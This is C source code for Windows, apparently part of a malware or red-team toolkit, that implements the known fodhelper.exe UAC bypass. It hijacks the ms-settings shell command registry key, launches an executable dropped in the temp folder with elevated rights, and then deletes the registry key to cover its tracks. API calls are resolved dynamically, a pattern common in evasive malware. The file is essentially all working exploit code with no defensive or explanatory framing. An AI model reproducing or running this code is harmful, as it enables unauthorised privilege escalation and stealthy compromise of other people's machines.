#include <Windows.h>
#include <stdio.h>
//#include <shlwapi.h>

#include "LoadAPI.h"
#include "DebugFunc.h"

BOOL checkKey(Advapi32_API Advapi32Api, const char* subKeyTab) {
	HKEY hKey; 
	LSTATUS regKey = Advapi32Api.RegOpenKeyExAF(HKEY_CURRENT_USER, subKeyTab, 0, KEY_QUERY_VALUE, &hKey);
	if (ERROR_FILE_NOT_FOUND == regKey) {
		PrintDebug("\t[i] Creating registry key %s\n", subKeyTab);
		if (Advapi32Api.RegCreateKeyExAF(HKEY_CURRENT_USER, subKeyTab, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL) != ERROR_SUCCESS) {
			PrintDebug("\t[X] Critical fail %ld ! (RegCreateKeyExA)\n", GetLastError());
			return FALSE;
		}
	}
	else if (ERROR_SUCCESS != regKey) {
		PrintDebug("\t[X] Critical fail %ld ! (RegCreateKeyExA)\n", GetLastError());
		return FALSE;
	}
		
	Advapi32Api.RegCloseKeyF(hKey);
	return TRUE;
}

BOOL SetRegistryValue(Advapi32_API Advapi32Api, HKEY key, char* path, char* name, char* value) {
	BOOL returnValue = FALSE;
	HKEY hKey; 
	if (Advapi32Api.RegOpenKeyExAF(key, path, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS && hKey != NULL) {
		returnValue = Advapi32Api.RegSetValueExAF(hKey, name, 0, REG_SZ, (LPBYTE)value, (DWORD)strlen(value)) == ERROR_SUCCESS;
		Advapi32Api.RegCloseKeyF(hKey);
	}
	return returnValue;
}

BOOL DeleteRegistryKey(Advapi32_API Advapi32Api, HKEY key, char* path, char* name) {
	BOOL returnValue = FALSE;
	HKEY hKey; 
	if (Advapi32Api.RegOpenKeyExAF(key, path, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS && hKey != NULL) {
		returnValue = Advapi32Api.RegDeleteTreeAF(hKey, name) == ERROR_SUCCESS;
		Advapi32Api.RegCloseKeyF(hKey);
	}
	return returnValue;
}


//void DisableWindowsRedirection(Kernel32_API Kernel32Api, PVOID* pOldVal) {
//#ifdef _WIN32     
//	if (!Kernel32Api.Wow64DisableWow64FsRedirectionF(pOldVal))
//		printf("\t[X] Wow64DisableWow64FsRedirection Failed !!!\n");
//#endif // _M_AMD64
//}
//void RevertWindowsRedirection(Kernel32_API Kernel32Api, PVOID pOldVal) {
//	#ifdef _WIN32   
//	if (!Kernel32Api.Wow64RevertWow64FsRedirectionF(pOldVal))
//		printf("\t[X] Wow64RevertWow64FsRedirection Failed !!!\n");
//#endif // _M_AMD64
//}

BOOL ExploitFodhelper(API_Call APICall, char* PathExeToRun) {
	PVOID pOldVal = NULL;
	const char* regKey = "Software\\Classes\\ms-settings\\Shell\\Open\\command";
	BOOL returnValue = FALSE;


	//DisableWindowsRedirection(APICall.Kernel32Api ,&pOldVal); // check if 32/64 bit 
	if (checkKey(APICall.Advapi32Api,regKey)) {
		returnValue = SetRegistryValue(APICall.Advapi32Api,HKEY_CURRENT_USER, (char*)regKey, "DelegateExecute", "");
		returnValue &= SetRegistryValue(APICall.Advapi32Api,HKEY_CURRENT_USER, (char*)regKey, "", PathExeToRun);
		if (returnValue) {
			returnValue = ((int)APICall.Shell32Api.ShellExecuteAF(NULL, "runas", "C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, SW_SHOWNORMAL) > 32);
			APICall.Kernel32Api.SleepF(500);
			DeleteRegistryKey(APICall.Advapi32Api,HKEY_CURRENT_USER, (char*)"Software\\Classes", "ms-settings");
		}
	}
	//RevertWindowsRedirection(APICall.Kernel32Api, pOldVal);

	return returnValue;
}



char* GetFileToRun(Kernel32_API Kernel32Api) {
	char* dropPath = (char*)calloc(MAX_PATH + 1, 1);
	if (dropPath == NULL)
		return NULL;
	if (Kernel32Api.GetTempPathAF(MAX_PATH, dropPath) > 0)
		strcat_s(dropPath, MAX_PATH, "23E8BC3FE-A258-CF1F-FDD0-F5B3ECFC7A6\\DuplicateToke.exe");

	return dropPath;
}

BOOL IsRunAsAdministrator() {
	BOOL b = FALSE;
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	PSID AdministratorsGroup;
	if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup)) {
		if (!CheckTokenMembership(NULL, AdministratorsGroup, &b))
			b = FALSE;
		FreeSid(AdministratorsGroup);
	}
	return b;
}


BOOL UACBypass(API_Call APICall){
	char* fileToRun = GetFileToRun(APICall.Kernel32Api);
	if (fileToRun == NULL)
		return FALSE;

	// loadApi

// IsRunAsAdmin
// IsUserInAdminGroup


	if (!IsRunAsAdministrator()) {
		PrintDebug("[-] WINDOWS 10 - Privilege Escalation exploit (Target fodhelper.exe):\n");
		if (ExploitFodhelper(APICall, fileToRun)) {
			PrintDebug("\t[+] Exploit work successfully !\n");
			PrintDebug("\t[+] Process created: %s !\n", fileToRun);
		} else {
			PrintDebug("\t[X] Exploit failed !\n");
			free(fileToRun);
			return FALSE;
		}
	}else
		APICall.Shell32Api.ShellExecuteAF(NULL, "runas", fileToRun, NULL, NULL, SW_SHOWNORMAL);

	free(fileToRun);
	return TRUE;
}